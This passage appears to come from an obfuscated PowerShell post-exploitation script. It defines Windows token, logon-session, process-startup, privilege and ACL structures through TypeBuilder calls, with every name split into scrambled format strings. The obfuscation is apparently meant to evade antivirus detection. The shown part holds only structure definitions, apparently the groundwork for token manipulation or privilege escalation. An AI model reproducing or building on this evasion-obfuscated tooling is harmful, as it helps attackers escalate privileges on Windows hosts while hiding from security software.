    ${TyP`eB`uilDER}.("{1}{2}{0}{3}" -f 'neFie','Def','i','ld').Invoke(("{2}{1}{3}{0}{4}" -f 'e','r','Impe','sonationLev','l'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{0}{2}{1}"-f 'O','ull','ut-N')
    ${t`ypEBuiLD`ER}.("{1}{0}{3}{2}" -f'F','Define','eld','i').Invoke(("{0}{2}{1}" -f 'Dynam','ged','icChar'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{0}{1}{2}" -f'Out-N','u','ll')
    ${tYpebu`IL`d`ER}.("{0}{1}{2}" -f 'Defin','eFie','ld').Invoke(("{2}{0}{3}{1}{4}"-f 'yna','Ava','D','mic','ilable'), [UInt32], ("{0}{1}"-f'Pu','blic')) | &("{0}{2}{1}" -f 'Out-N','l','ul')
    ${tYpEB`u`iLD`er}.("{1}{0}{2}" -f'ine','Def','Field').Invoke(("{0}{1}{3}{2}"-f 'Grou','pCo','nt','u'), [UInt32], ("{0}{1}{2}" -f'Publ','i','c')) | &("{2}{0}{1}"-f '-N','ull','Out')
    ${T`Ypeb`uIld`ER}.("{1}{2}{0}" -f'ield','D','efineF').Invoke(("{3}{4}{2}{1}{0}" -f't','oun','C','Pr','ivilege'), [UInt32], ("{1}{0}" -f'ublic','P')) | &("{2}{1}{0}"-f'l','ut-Nul','O')
    ${T`Ype`B`UildeR}.("{0}{1}{2}" -f 'Defi','ne','Field').Invoke(("{1}{2}{0}" -f'ifiedId','Mo','d'), ${lu`Id}, ("{2}{1}{0}"-f 'lic','b','Pu')) | &("{1}{0}{2}" -f 'Nul','Out-','l')
	${t`OkE`N_sta`TiSTIcS} = ${TypE`B`Uil`der}.("{2}{1}{0}" -f 'e','eateTyp','Cr').Invoke()

    
    ${AttRIb`u`T`ES} = ("{10}{13}{7}{11}{3}{2}{0}{4}{8}{6}{5}{9}{1}{14}{12}" -f'Sequ','oreFieldI',', ',', AnsiClass, Class, Public','entialL','e',', S','Layou','ayout','aled, Bef','Au','t','it','to','n')
	${ty`peB`uild`eR} = ${MODUL`Eb`uIl`der}.("{0}{1}{2}" -f'Defi','neT','ype').Invoke(("{4}{1}{3}{0}{2}" -f 'TRIN','SA_UNIC','G','ODE_S','L'), ${A`TtRiB`u`TES}, [System.ValueType])
	${Ty`pE`BuILd`ER}.("{0}{2}{1}" -f 'Defi','ld','neFie').Invoke(("{0}{1}" -f'Lengt','h'), [UInt16], ("{2}{0}{1}"-f'li','c','Pub')) | &("{1}{0}"-f'l','Out-Nul')
	${tyPEb`uI`L`DER}.("{0}{2}{1}"-f 'Defi','ld','neFie').Invoke(("{1}{0}{3}{2}"-f'ax','M','h','imumLengt'), [UInt16], ("{1}{2}{0}"-f 'c','Publ','i')) | &("{0}{1}"-f'Out-Nul','l')
    ${ty`PEBu`iLD`eR}.("{2}{1}{0}"-f'ld','ineFie','Def').Invoke(("{1}{0}"-f 'r','Buffe'), [IntPtr], ("{1}{0}" -f'lic','Pub')) | &("{1}{0}"-f '-Null','Out')
	${L`Sa_`UnICo`D`e_STrI`NG} = ${Ty`pEBU`ildER}.("{0}{1}{2}"-f'CreateT','yp','e').Invoke()

    
    ${A`T`TRibutES} = ("{20}{2}{15}{12}{0}{16}{22}{7}{11}{6}{14}{13}{8}{3}{18}{4}{10}{17}{19}{5}{21}{1}{23}{9}" -f'AnsiCla','ieldI','ay','e','ent',', Before','lass, Pub',', ','S','t','ialLayo','C',', ','c, ','li','out','s','ut,','qu',' Sealed','AutoL','F','s','ni')
	${typeb`U`iL`deR} = ${MODU`l`EBUi`ldER}.("{2}{0}{3}{1}" -f'ef','pe','D','ineTy').Invoke(("{1}{2}{5}{3}{4}{6}{0}" -f 'O','LSA_LAST_','I','LO','GON_','NTER_','INF'), ${A`T`TrIBuTES}, [System.ValueType])
	${TypeBui`L`D`eR}.("{2}{0}{1}"-f 'f','ineField','De').Invoke(("{5}{4}{2}{1}{3}{0}" -f 'ogon','fu','s','lL','astSucces','L'), ${la`RgE_`INte`Ger}, ("{0}{1}"-f 'Pub','lic')) | &("{0}{1}{2}"-f 'Ou','t','-Null')
	${Typ`Eb`UiLD`ER}.("{0}{2}{1}" -f 'De','ield','fineF').Invoke(("{2}{3}{0}{1}" -f 'ailedLo','gon','Las','tF'), ${L`Ar`GE`_iNteger}, ("{2}{1}{0}" -f'c','i','Publ')) | &("{0}{1}" -f 'Out-Nu','ll')
    ${t`yPEB`U`ILDer}.("{1}{2}{0}{3}" -f 'ne','Def','i','Field').Invoke(("{3}{6}{0}{5}{1}{8}{7}{4}{2}"-f 'edAt','pt','ogon','Fa','essfulL','tem','il','tSucc','CountSinceLas'), [UInt32], ("{1}{0}"-f 'c','Publi')) | &("{1}{0}"-f 't-Null','Ou')
	${lSa_lAS`T_INter_LOG`O`N_i`NFO} = ${TyPE`B`U`ILDeR}.("{2}{0}{1}" -f 'Ty','pe','Create').Invoke()

    
    ${ATt`RiBut`es} = ("{5}{3}{6}{12}{1}{4}{7}{9}{0}{8}{10}{2}{11}"-f ', ','e','eldI',' ','quentialLayout','AutoLayout,','AnsiClass, Class, Public, ',', Seale','Be','d','foreFi','nit','S')
	${tYpEb`UIlD`Er} = ${moduL`e`BU`IL`dEr}.("{3}{1}{0}{2}" -f 'T','ine','ype','Def').Invoke(("{7}{2}{3}{1}{5}{0}{6}{4}" -f 'SS','_S','EC','URITY_LOGON','_DATA','E','ION','S'), ${atT`RIBuT`Es}, [System.ValueType])
	${tYp`eB`UILdeR}.("{2}{1}{0}{3}" -f'neFie','fi','De','ld').Invoke(("{1}{0}" -f'ize','S'), [UInt32], ("{0}{1}"-f'Publ','ic')) | &("{2}{1}{0}"-f'ull','-N','Out')
	${T`yPebui`lDer}.("{1}{2}{0}{3}"-f 'eFie','Def','in','ld').Invoke(("{0}{1}"-f 'Lo','ginID'), ${L`UiD}, ("{0}{1}"-f'Publi','c')) | &("{0}{1}" -f 'Ou','t-Null')
    ${tYp`eb`uILDEr}.("{0}{2}{1}"-f 'Def','eld','ineFi').Invoke(("{1}{2}{0}" -f 'e','Us','ernam'), ${lsA_`unICo`DE_S`TRI`Ng}, ("{0}{1}" -f'P','ublic')) | &("{0}{1}" -f'Out-Nul','l')
    ${t`yP`EbuIldEr}.("{0}{1}{2}"-f'D','efineFi','eld').Invoke(("{1}{3}{2}{0}"-f'n','Log','ai','inDom'), ${LSA`_`unICodE_`ST`Ri`Ng}, ("{2}{1}{0}"-f'c','i','Publ')) | &("{2}{0}{1}" -f'ut-Nu','ll','O')
    ${typ`E`Bu`ILdEr}.("{1}{0}{2}" -f 'f','De','ineField').Invoke(("{4}{5}{2}{1}{0}{3}" -f'nP','atio','c','ackage','Authen','ti'), ${LSa_UnI`co`De_st`R`InG}, ("{1}{2}{0}"-f 'lic','Pu','b')) | &("{0}{1}"-f'Out-','Null')
    ${TyP`Eb`UILD`ER}.("{1}{2}{0}" -f'eld','Defin','eFi').Invoke(("{1}{2}{0}"-f 'ype','Logo','nT'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{0}{2}{1}" -f 'Out-N','l','ul')
    ${TyP`eB`u`ildeR}.("{0}{1}{2}" -f 'DefineFi','el','d').Invoke(("{1}{0}"-f 'ssion','Se'), [UInt32], ("{1}{0}{2}"-f 'l','Pub','ic')) | &("{2}{0}{1}"-f 't-N','ull','Ou')
    ${ty`PE`BUiLD`Er}."dE`Fi`Ne`FIeld"('Sid', [IntPtr], ("{0}{1}{2}" -f'P','ub','lic')) | &("{0}{1}"-f'Out','-Null')
    ${tyP`eBU`IlDer}.("{2}{0}{1}"-f 'i','eld','DefineF').Invoke(("{2}{0}{1}" -f'im','e','LoginT'), ${lArG`E_I`NtEg`Er}, ("{2}{1}{0}"-f 'blic','u','P')) | &("{2}{1}{0}" -f'ull','-N','Out')
    ${t`yPEBUiL`DEr}.("{3}{0}{1}{2}" -f'efi','n','eField','D').Invoke(("{1}{2}{3}{0}" -f 'rver','Log','inS','e'), ${lSA_UNi`c`Ode_stR`iNG}, ("{1}{2}{0}" -f 'ic','Pub','l')) | &("{1}{0}"-f'll','Out-Nu')
    ${tY`pEbU`IldEr}.("{0}{2}{1}{3}"-f'Defi','eFie','n','ld').Invoke(("{0}{2}{1}{3}"-f'DnsD','inN','oma','ame'), ${Ls`A`_uNIcO`d`E_S`TrINg}, ("{0}{1}"-f'Publ','ic')) | &("{0}{1}"-f'Out-','Null')
    ${tyP`eBU`iLd`ER}.("{1}{2}{0}"-f'ield','Def','ineF').Invoke('Upn', ${LsA_`unICOD`e_s`TR`iNG}, ("{1}{0}" -f'c','Publi')) | &("{2}{0}{1}"-f '-Nu','ll','Out')
    ${type`B`UIL`Der}.("{2}{1}{3}{0}" -f 'ld','fine','De','Fie').Invoke(("{0}{1}{2}"-f 'UserF','l','ags'), [UInt32], ("{1}{0}"-f 'ublic','P')) | &("{0}{1}" -f 'Out-N','ull')
    ${tYpE`Bui`LDeR}.("{1}{0}{3}{2}" -f 'ef','D','Field','ine').Invoke(("{1}{0}{3}{2}{4}" -f'onI','LastLog','f','n','o'), ${lsA`_L`A`St`_`inTE`R_L`ogon_info}, ("{0}{1}" -f 'Publi','c')) | &("{1}{0}{2}" -f'-','Out','Null')
    ${tYp`Eb`uilD`ER}.("{2}{3}{0}{1}" -f'i','eld','D','efineF').Invoke(("{0}{2}{1}" -f 'Logo','pt','nScri'), ${l`Sa_un`ICode_`S`TR`Ing}, ("{1}{0}" -f 'c','Publi')) | &("{1}{0}" -f 'ut-Null','O')
    ${t`ypeBUIl`der}.("{2}{0}{3}{1}"-f'efi','eField','D','n').Invoke(("{0}{2}{1}"-f 'Prof','h','ilePat'), ${lsA_u`NiCOd`E_st`R`ING}, ("{0}{2}{1}" -f 'Pu','lic','b')) | &("{2}{1}{0}"-f 'll','Nu','Out-')
    ${TyPeb`uIld`ER}.("{2}{0}{1}" -f 'el','d','DefineFi').Invoke(("{2}{0}{3}{1}"-f 'e','ory','Hom','Direct'), ${LSa_`Uni`cOdE`_sT`R`iNg}, ("{2}{1}{0}"-f 'ic','l','Pub')) | &("{2}{0}{1}" -f 't','-Null','Ou')
    ${tYpeb`ui`lD`eR}.("{0}{1}{2}" -f 'Define','Fiel','d').Invoke(("{0}{1}{4}{3}{2}" -f 'H','omeDirector','rive','D','y'), ${L`sa_UNiCO`D`e_st`Ring}, ("{1}{0}" -f'ublic','P')) | &("{1}{2}{0}" -f'll','Out-','Nu')
    ${Ty`PE`BU`iLdER}.("{2}{1}{0}{3}"-f'ie','eF','Defin','ld').Invoke(("{1}{0}{3}{2}" -f 'ogof','L','me','fTi'), ${L`A`RGe`_integ`eR}, ("{0}{1}"-f 'Publi','c')) | &("{1}{2}{0}"-f'l','Out-Nu','l')
    ${tYpEb`U`IlD`Er}.("{3}{2}{0}{1}"-f'e','Field','efin','D').Invoke(("{3}{0}{2}{1}"-f 'ckOff','e','Tim','Ki'), ${L`ARGE_iNTe`gEr}, ("{1}{0}" -f'c','Publi')) | &("{1}{2}{0}"-f '-Null','Ou','t')
    ${t`yp`EbuIlDER}.("{1}{2}{3}{0}"-f'd','D','efin','eFiel').Invoke(("{0}{1}{4}{2}{3}" -f'Pa','sswordL','S','et','ast'), ${LARgE_`In`Te`g`Er}, ("{1}{0}"-f'lic','Pub')) | &("{0}{1}"-f'Out-Nul','l')
    ${T`yP`EBUiL`dER}.("{2}{0}{1}{3}"-f'eF','ie','Defin','ld').Invoke(("{3}{1}{2}{4}{0}"-f 'ge','n','Ch','PasswordCa','an'), ${L`AR`Ge_in`TeG`er}, ("{0}{1}{2}" -f 'Pu','bl','ic')) | &("{1}{2}{0}"-f 'ull','O','ut-N')
    ${tYPEb`U`iLdeR}.("{0}{1}{2}" -f'De','fin','eField').Invoke(("{3}{1}{0}{4}{2}"-f'o','sw','ge','Pas','rdMustChan'), ${lARGe_`I`N`Te`gEr}, ("{0}{1}"-f'P','ublic')) | &("{2}{1}{0}"-f'ull','t-N','Ou')
	${S`ecUrit`y_`L`ogON_`SessI`oN_`d`AtA} = ${typ`e`BuiLder}.("{2}{0}{3}{1}"-f'eTy','e','Creat','p').Invoke()

    
    ${a`TT`RI`BUTES} = ("{9}{4}{12}{3}{2}{10}{11}{6}{0}{5}{1}{7}{8}"-f'alLayout, Sea','BeforeFi',' Publi','s,','utoLayout,','led, ','uenti','eldI','nit','A','c, ','Seq',' AnsiClass, Clas')
	${ty`PE`BuIL`der} = ${M`OduLEb`uilD`Er}.("{3}{1}{2}{0}" -f'e','Ty','p','Define').Invoke(("{2}{3}{0}{1}"-f 'F','O','STA','RTUPIN'), ${a`TtRIbu`TeS}, [System.ValueType])
	${t`YPEBuIlD`eR}."deFinef`i`ELD"('cb', [UInt32], ("{0}{2}{1}"-f'P','lic','ub')) | &("{2}{0}{1}" -f'ut-N','ull','O')
	${type`BUi`ldER}.("{0}{1}{2}" -f 'Def','i','neField').Invoke(("{1}{0}{2}" -f'e','lpRes','rved'), [IntPtr], ("{1}{0}" -f'blic','Pu')) | &("{2}{1}{0}"-f 'll','ut-Nu','O')
    ${TYpE`BU`ild`Er}.("{0}{1}{2}"-f 'Define','F','ield').Invoke(("{2}{1}{0}" -f'p','eskto','lpD'), [IntPtr], ("{1}{0}" -f 'c','Publi')) | &("{0}{1}"-f 'Out-Nul','l')
    ${TYP`eB`uI`LDeR}.("{1}{2}{0}"-f 'ield','D','efineF').Invoke(("{0}{1}{2}"-f'lp','Tit','le'), [IntPtr], ("{0}{1}" -f 'P','ublic')) | &("{2}{1}{0}" -f 'Null','-','Out')
    ${tyPeBU`il`dEr}."De`FIn`e`FIEld"('dwX', [UInt32], ("{0}{1}{2}"-f'P','ubl','ic')) | &("{2}{0}{1}"-f'-Nul','l','Out')
    ${TyP`eBU`ILDer}."dEFinEfI`E`Ld"('dwY', [UInt32], ("{0}{1}{2}"-f'Publ','i','c')) | &("{1}{2}{0}" -f'ull','Out','-N')
    ${t`yPeBuI`Ld`Er}.("{2}{3}{1}{0}"-f 'ield','neF','De','fi').Invoke(("{1}{0}"-f 'XSize','dw'), [UInt32], ("{1}{0}"-f'lic','Pub')) | &("{2}{1}{0}" -f 'll','u','Out-N')
    ${tYp`eBui`LdER}.("{0}{3}{2}{1}" -f'D','d','l','efineFie').Invoke(("{0}{1}{2}" -f 'dwY','Si','ze'), [UInt32], ("{2}{0}{1}"-f 'li','c','Pub')) | &("{0}{1}{2}" -f 'Ou','t-','Null')
    ${T`y`PEbuIlD`ER}.("{1}{0}{2}"-f 'fin','De','eField').Invoke(("{0}{2}{1}" -f'dw','ountChars','XC'), [UInt32], ("{0}{1}"-f 'Publ','ic')) | &("{2}{0}{1}" -f't-N','ull','Ou')
    ${T`Ype`Bu`ILdeR}.("{2}{0}{1}"-f'ineFi','eld','Def').Invoke(("{1}{2}{0}" -f 'rs','dwY','CountCha'), [UInt32], ("{0}{1}" -f 'Publ','ic')) | &("{1}{0}{2}" -f 'ul','Out-N','l')
    ${T`yP`EB`UiLdER}.("{3}{1}{0}{2}" -f'F','ine','ield','Def').Invoke(("{1}{0}{3}{4}{2}" -f'FillAtt','dw','e','r','ibut'), [UInt32], ("{2}{0}{1}" -f 'bli','c','Pu')) | &("{1}{0}"-f't-Null','Ou')
    ${TYPEbuI`L`Der}.("{3}{0}{2}{1}" -f'neFi','d','el','Defi').Invoke(("{2}{0}{1}"-f 'w','Flags','d'), [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{1}{0}" -f 'll','Out-Nu')
    ${typE`Buil`DER}.("{2}{1}{0}{3}"-f 'fineFi','e','D','eld').Invoke(("{3}{2}{1}{0}"-f'w','do','owWin','wSh'), [UInt16], ("{0}{1}{2}" -f 'Pu','b','lic')) | &("{0}{1}"-f 'Out-Nul','l')
    ${TYpe`Bu`i`lDeR}.("{1}{0}{2}" -f 'f','De','ineField').Invoke(("{1}{2}{3}{0}"-f 'ved2','cb','R','eser'), [UInt16], ("{0}{1}"-f'P','ublic')) | &("{2}{1}{0}"-f'l','ut-Nul','O')
    ${T`Y`pEBuiLDeR}.("{2}{1}{0}"-f'Field','e','Defin').Invoke(("{0}{1}{2}"-f'lpRe','serve','d2'), [IntPtr], ("{0}{1}"-f'Publi','c')) | &("{0}{2}{1}" -f'Out-N','l','ul')
    ${ty`peB`u`iLDEr}.("{2}{0}{1}" -f 'ineFie','ld','Def').Invoke(("{1}{0}{2}"-f'dInp','hSt','ut'), [IntPtr], ("{1}{2}{0}"-f 'lic','P','ub')) | &("{2}{0}{1}" -f 'Nu','ll','Out-')
    ${Ty`p`ebuIL`dER}.("{3}{0}{1}{2}" -f 'ef','ine','Field','D').Invoke(("{2}{1}{0}"-f'tput','u','hStdO'), [IntPtr], ("{1}{0}" -f 'blic','Pu')) | &("{0}{2}{1}" -f'O','Null','ut-')
    ${TYPE`Bu`IlDeR}.("{0}{2}{1}" -f 'DefineF','eld','i').Invoke(("{0}{1}" -f 'hStdErr','or'), [IntPtr], ("{1}{0}"-f 'blic','Pu')) | &("{0}{2}{1}" -f'Ou','ll','t-Nu')
	${sTaR`T`upI`NFO} = ${T`YPeBUil`der}.("{1}{2}{0}" -f 'e','Create','Typ').Invoke()

    
    ${AT`Tr`IB`UteS} = ("{5}{1}{12}{20}{18}{11}{21}{8}{2}{15}{16}{9}{17}{0}{4}{13}{10}{3}{7}{14}{19}{6}"-f 'a','toL','ub','a','l','Au','FieldInit','led,',', P','q','e','lass, Clas','ayo','Layout, S',' Befor','lic, S','e','uenti','siC','e','ut, An','s')
	${tyPebU`ilD`eR} = ${M`od`UlEBU`I`Lder}.("{2}{0}{1}"-f 'ine','Type','Def').Invoke(("{3}{4}{2}{0}{1}{5}"-f 'INFOR','MATIO','S_','P','ROCES','N'), ${ATTri`BU`T`eS}, [System.ValueType])
	${TYp`EBuIL`d`ER}.("{0}{3}{2}{1}"-f 'Def','ield','neF','i').Invoke(("{1}{2}{0}" -f 'ess','hPr','oc'), [IntPtr], ("{0}{1}"-f 'P','ublic')) | &("{1}{0}" -f '-Null','Out')
	${Ty`pEBu`Il`Der}.("{2}{0}{1}"-f 'ineFiel','d','Def').Invoke(("{1}{2}{0}" -f'ead','hTh','r'), [IntPtr], ("{1}{0}" -f 'blic','Pu')) | &("{1}{0}" -f'-Null','Out')
    ${TypeBuI`l`DeR}.("{1}{3}{0}{2}"-f 'eF','D','ield','efin').Invoke(("{2}{0}{1}" -f'ce','ssId','dwPro'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{1}"-f'Out-N','ull')
    ${T`YPeBuIL`DER}.("{0}{2}{1}"-f 'De','eld','fineFi').Invoke(("{2}{1}{0}"-f 'adId','wThre','d'), [UInt32], ("{2}{0}{1}" -f'l','ic','Pub')) | &("{1}{0}" -f'l','Out-Nul')
	${P`RoC`Ess_InF`O`RMATION} = ${t`YpebUil`DEr}.("{2}{1}{0}" -f'ype','eateT','Cr').Invoke()

    
    ${A`T`TRi`Butes} = ("{4}{12}{11}{3}{8}{5}{2}{15}{10}{0}{7}{13}{1}{14}{16}{9}{6}{17}" -f 's, Pu','S','C','t','Auto','nsiClass, ','f','bl',', A','ed, Be','as','ou','Lay','ic, SequentialLayout, ','ea','l','l','oreFieldInit')
	${Ty`Pe`BuiL`DEr} = ${MOD`ULeBU`Il`DeR}.("{1}{0}{3}{2}"-f'fineT','De','pe','y').Invoke(("{2}{0}{1}{4}{3}"-f'EN','_ELEV','TOK','ION','AT'), ${AtTR`I`BU`TEs}, [System.ValueType])
	${TYpE`BU`Il`der}.("{1}{0}{2}"-f'neFie','Defi','ld').Invoke(("{2}{3}{1}{0}" -f 'd','ate','Toke','nIsElev'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{0}{1}{2}" -f'Out-','Nul','l')
	${ToK`EN_E`LEVAT`i`ON} = ${tYPE`B`UIl`DeR}.("{2}{1}{0}"-f'e','reateTyp','C').Invoke()

    
    ${att`R`Ibut`ES} = ("{9}{5}{1}{6}{3}{8}{10}{0}{4}{12}{11}{2}{7}"-f ', SequentialLa','ayout, Ans','el','ass, Cla','yout, Seal','utoL','iCl','dInit','ss, P','A','ublic',', BeforeFi','ed')
    ${ty`Pe`BUIldeR} = ${mo`dUl`e`Bu`iLDER}.("{3}{1}{0}{2}"-f'p','neTy','e','Defi').Invoke(("{4}{2}{1}{0}{6}{3}{5}"-f'RIB','_ATT','ID_AND','T','LU','ES','U'), ${at`TR`ib`uTEs}, [System.ValueType], 12)
    ${tYp`EbUil`DEr}.("{1}{2}{0}" -f 'ield','De','fineF').Invoke(("{0}{1}" -f 'Lu','id'), ${l`uiD}, ("{1}{0}"-f 'ublic','P')) | &("{1}{0}{2}"-f'ut-Nu','O','ll')
    ${T`yp`ebUI`ldER}.("{3}{1}{2}{0}"-f'ld','ef','ineFie','D').Invoke(("{1}{2}{0}"-f'ibutes','At','tr'), [UInt32], ("{0}{1}"-f'Publ','ic')) | &("{2}{1}{0}"-f'Null','t-','Ou')
    ${lUiD_aN`D_A`TT`RI`Bu`Tes} = ${ty`P`ebUI`lDEr}.("{3}{2}{0}{1}"-f 'eateTy','pe','r','C').Invoke()
		
    
    ${AT`TrI`BU`TeS} = ("{21}{4}{12}{19}{8}{1}{7}{15}{14}{11}{3}{5}{18}{16}{23}{17}{10}{6}{9}{0}{20}{13}{2}{22}"-f'Bef',' ','ieldIni','equ','utoL','ent','led,','C',', AnsiClass,',' ','Sea','S','ay','eF','blic, ','lass, Pu','lL','out, ','ia','out','or','A','t','ay')
    ${ty`pEbu`Il`dER} = ${moDuL`EB`UI`LDER}.("{2}{0}{1}"-f'e','Type','Defin').Invoke(("{3}{2}{1}{0}"-f 'S','GE','EN_PRIVILE','TOK'), ${ATtrIBU`T`ES}, [System.ValueType], 16)
    ${type`BUIL`Der}.("{1}{0}{2}" -f 'fineFie','De','ld').Invoke(("{1}{0}{2}" -f'e','Privil','geCount'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{2}{0}{1}"-f'N','ull','Out-')
    ${tyP`EbU`IL`DeR}.("{2}{1}{0}" -f 'ld','neFie','Defi').Invoke(("{0}{2}{1}"-f'Pr','vileges','i'), ${lu`I`d`_a`ND_`ATtRIBuTEs}, ("{1}{0}{2}"-f 'i','Publ','c')) | &("{2}{1}{0}" -f 't-Null','u','O')
    ${TokE`N_PRi`VIL`EgEs} = ${ty`p`e`BUiLder}.("{3}{2}{1}{0}" -f 'e','Typ','eate','Cr').Invoke()

    
    ${ATt`Ri`Bu`Tes} = ("{19}{2}{14}{12}{5}{10}{1}{9}{0}{11}{8}{7}{21}{20}{17}{4}{18}{16}{15}{13}{6}{3}" -f 'Public','ass,','ou','nit','Seal','AnsiCl','I','u','Seq',' ','ass, Cl',', ',', ','eField','t','r','Befo','ut, ','ed, ','AutoLay','ntialLayo','e')
    ${tyP`eBui`l`Der} = ${modUle`BUI`lD`ER}.("{2}{0}{3}{1}" -f 'efine','pe','D','Ty').Invoke(("{0}{2}{1}"-f 'ACE_H','ADER','E'), ${a`TtRI`Bu`TeS}, [System.ValueType])
    ${TypEB`U`iLDEr}.("{3}{0}{1}{2}"-f 'e','fineFie','ld','D').Invoke(("{0}{1}" -f 'Ace','Type'), [Byte], ("{0}{1}" -f 'Pub','lic')) | &("{1}{2}{0}"-f'ull','Out','-N')
    ${Typ`eb`UIld`er}.("{1}{0}{2}" -f 'e','Defin','Field').Invoke(("{1}{0}"-f 'ceFlags','A'), [Byte], ("{1}{0}"-f 'ublic','P')) | &("{1}{0}"-f'll','Out-Nu')
    ${T`ypEbui`LdER}.("{2}{0}{1}"-f 'fin','eField','De').Invoke(("{1}{0}"-f 'ze','AceSi'), [UInt16], ("{1}{0}"-f 'lic','Pub')) | &("{1}{0}"-f'ut-Null','O')
    ${ace`_`heaDER} = ${tY`peB`U`ildEr}.("{2}{0}{1}"-f'eT','ype','Creat').Invoke()

    
    ${aT`TRIB`UtEs} = ("{21}{13}{8}{16}{15}{2}{10}{6}{3}{12}{19}{14}{17}{9}{1}{5}{11}{7}{0}{18}{20}{4}" -f'ed, Befo','yout,','ss','P','nit',' ','ass, ','al','out','alLa',', Cl','Se','ublic, Se','utoLay','uent',' AnsiCla',',','i','reF','q','ieldI','A')
    ${tYpE`B`uIl`dEr} = ${M`odu`Le`BuILDER}."D`EFI`Ne`TYpE"('ACL', ${ATTRIB`uT`ES}, [System.ValueType])
    ${TYp`eBu`i`LDer}.("{0}{1}{2}" -f'Def','ineF','ield').Invoke(("{0}{2}{1}{3}" -f'AclR','i','ev','sion'), [Byte], ("{0}{1}{2}"-f 'Pub','li','c')) | &("{0}{1}{2}"-f 'O','ut-','Null')
    ${TYpE`B`uILd`Er}.("{3}{1}{2}{0}"-f 'eld','fineF','i','De').Invoke(("{1}{0}" -f 'bz1','S'), [Byte], ("{0}{1}" -f 'Pub','lic')) | &("{0}{1}" -f 'O','ut-Null')
    ${typ`e`BuIlDEr}.("{0}{2}{3}{1}" -f'D','d','efineFi','el').Invoke(("{1}{0}{2}" -f 'z','AclSi','e'), [UInt16], ("{1}{0}" -f'blic','Pu')) | &("{0}{1}"-f 'Out-N','ull')
    ${TyPE`Bu`iLDEr}.("{2}{1}{0}" -f 'ield','fineF','De').Invoke(("{2}{1}{0}"-f 'nt','u','AceCo'), [UInt16], ("{1}{0}" -f'ic','Publ')) | &("{1}{0}{2}"-f 'ut-Nul','O','l')
    ${ty`pEB`U`IldER}.("{3}{1}{0}{2}"-f 'Fie','ine','ld','Def').Invoke(("{0}{1}" -f 'S','bz2'), [UInt16], ("{0}{1}{2}"-f 'Pu','bl','ic')) | &("{0}{1}{2}" -f'O','ut','-Null')
    ${A`cl} = ${TYP`EB`u`Ilder}.("{0}{1}{2}"-f 'Cr','eat','eType').Invoke()

    
    ${at`T`Ri`BuTeS} = ("{17}{10}{8}{15}{18}{7}{6}{13}{5}{2}{12}{9}{11}{19}{0}{14}{3}{1}{16}{4}"-f'Seal',' B','quent',',','eFieldInit',', Public, Se','s','siClass, Cla','oLayout','y','ut','ou','ialLa','s','ed',', ','efor','A','An','t, ')
    ${T`YPeBU`iLDEr} = ${MOd`U`LeB`UiLdeR}.("{1}{0}{2}" -f'f','De','ineType').Invoke(("{2}{5}{0}{4}{3}{1}" -f 'ESS_','CE','AC','A','ALLOWED_','C'), ${a`TtRibUt`es}, [System.ValueType])
    ${TyPE`B`UILDEr}.("{2}{1}{0}"-f'eld','i','DefineF').Invoke(("{0}{1}"-f 'H','eader'), ${a`ce_`he`AdER}, ("{0}{1}" -f 'Publ','ic')) | &("{0}{1}" -f 'Out-Nul','l')
    ${T`YpeBUiL`dEr}.("{1}{2}{0}"-f'eField','Defi','n').Invoke(("{1}{0}"-f 'sk','Ma'), [UInt32], ("{0}{1}" -f 'Publi','c')) | &("{1}{0}{2}"-f 'Nul','Out-','l')
    ${typ`e`B`uiLdER}.("{1}{3}{0}{2}"-f'F','Def','ield','ine').Invoke(("{0}{1}"-f 'SidStar','t'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | &("{0}{1}{2}"-f'Out-','N','ull')
    ${AC`CEsS_a`lL`OW`Ed`_ace} = ${TyP`e`BU`IlDeR}.("{1}{2}{0}" -f 'ype','Create','T').Invoke()

    
    ${aT`TrIb`u`Tes} = ("{4}{15}{7}{0}{11}{9}{8}{5}{2}{10}{13}{1}{3}{14}{6}{12}" -f'ss','led','ou',', B','Aut','equentialLay','ld',', AnsiCla',' S',' Class, Public,','t, Se',',','Init','a','eforeFie','oLayout')
    ${t`YpEBU`iLDEr} = ${M`OdulE`B`uilDER}.("{1}{2}{0}{3}" -f'eTy','Defi','n','pe').Invoke(("{2}{0}{1}" -f 'RUSTE','E','T'), ${Att`RIBU`T`ES}, [System.ValueType])
    ${TYpEB`uIl`deR}.("{2}{1}{0}"-f 'ield','F','Define').Invoke(("{0}{2}{1}" -f 'pMultipleTru','e','ste'), [IntPtr], ("{1}{0}" -f 'blic','Pu')) | &("{0}{2}{1}"-f 'Out-Nu','l','l')
    ${tyP`E`Bui`Lder}.("{1}{0}{2}" -f 'e','DefineFi','ld').Invoke(("{7}{3}{6}{5}{2}{4}{1}{0}" -f 'on','ti','teeOpe','ul','ra','Trus','tiple','M'), [UInt32], ("{1}{0}" -f 'ic','Publ')) | &("{2}{0}{1}"-f'ut-Nu','ll','O')
    ${tyPEbui`l`DEr}.("{2}{3}{0}{1}"-f'Fiel','d','Defi','ne').Invoke(("{2}{1}{0}{3}"-f 'eF','ruste','T','orm'), [UInt32], ("{0}{1}"-f 'Pub','lic')) | &("{2}{1}{0}"-f'll','u','Out-N')
    ${t`y`p`eBUIlDER}.("{1}{0}{3}{2}"-f 'fi','De','ield','neF').Invoke(("{0}{1}{2}{3}"-f'T','rusteeT','y','pe'), [UInt32], ("{1}{2}{0}" -f 'lic','P','ub')) | &("{2}{0}{1}"-f't','-Null','Ou')
    ${tY`PeBUI`LD`er}.("{3}{1}{0}{2}" -f 'eFi','n','eld','Defi').Invoke(("{2}{1}{0}" -f 'me','trNa','pts'), [IntPtr], ("{0}{2}{1}"-f 'P','ic','ubl')) | &("{0}{1}" -f'Out-','Null')
    ${Tr`u`sTEE} = ${t`Y`PEBU`ILDer}.("{2}{0}{1}" -f 'eate','Type','Cr').Invoke()

    
    ${a`Ttr`Ib`UteS} = ("{10}{7}{2}{3}{9}{13}{6}{0}{12}{5}{11}{1}{4}{8}"-f'blic','Sealed, Bef','nsi','Class','oreFiel',' Seq','ss, Pu','utoLayout, A','dInit',', Cl','A','uentialLayout, ',',','a')
